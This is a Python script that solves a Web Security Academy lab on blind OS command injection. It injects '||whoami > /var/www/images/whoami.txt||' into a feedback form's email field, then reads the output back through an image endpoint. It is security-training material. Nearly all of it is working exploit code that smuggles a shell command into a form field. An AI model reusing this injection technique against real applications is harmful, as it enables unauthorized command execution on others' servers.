# Step 1: Import the libraries
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Avoid url warnings from showing.
# Step 2: Setting variables for the first request, this include sending the payload to the victim server
burp0_url = "https://0a8c008003d711c381d407d600a2001f.web-security-academy.net:443/feedback/submit" # the url of the target.

burp0_cookies = {"session": "f9SWxp7emlY0dw5BCerNOfL4oFJgGPMZ"} # cookies.

payload = "||whoami > /var/www/images/whoami.txt||" # payload to be injected.

proxy = {"http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080"} # proxy to allow traffic interception.

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a8c008003d711c381d407d600a2001f.web-security-academy.net", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://0a8c008003d711c381d407d600a2001f.web-security-academy.net/feedback", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=1", "Te": "trailers"} # request headers.

burp0_data = {"csrf": "GO8HadAZpYOym4wiFBfVfIy90Y5uhWDy", "name": "lol", "email": "lol@gmail.com" + payload, "subject": "lol", "message": "zxfchacbc"}# data sent with the request.

requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxy, verify=False) # post request with all its components.

# Step 3: Setting variable for the second request to retrieve the content of the exploit.
burp_url = "https://0a8c008003d711c381d407d600a2001f.web-security-academy.net:443/image?filename=whoami.txt" # URL of the request.
burp_cookies = {"session": "f9SWxp7emlY0dw5BCerNOfL4oFJgGPMZ"} # cookies.
burp_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0", "Accept": "image/avif,image/webp,*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://0a8c008003d711c381d407d600a2001f.web-security-academy.net/", "Sec-Fetch-Dest": "image", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=4", "Te": "trailers"} # request headers.
r = requests.get(url=burp_url, headers=burp_headers, cookies=burp_cookies, proxies=proxy, verify=False) # get request with all the components.

# conditional statement to check for the validation
if 'peter' in r.text:  
    print("[+] Lab is solved.")
else:
    print("[-] Lab is not solved.")
